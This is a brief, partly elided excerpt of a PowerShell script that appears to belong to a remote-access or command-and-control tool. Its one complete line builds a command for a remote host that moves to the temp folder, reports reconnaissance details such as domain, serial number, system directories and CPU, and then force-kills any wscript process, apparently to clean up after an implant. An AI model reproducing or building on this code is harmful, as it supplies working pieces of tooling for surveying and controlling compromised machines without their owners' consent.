...
.SYNOPSIS
   ...
   PS Script Dev Version: v2.10.10.10
...
$Command = "cd `$env:tmp;`"`n   RHost         : `"+`"$Remote_Host`"+`"``n   BootUpTime    : `"+$BootUpTime+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor+`"``n   WorkingDir    : `"+$RhostWorkingDir;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";
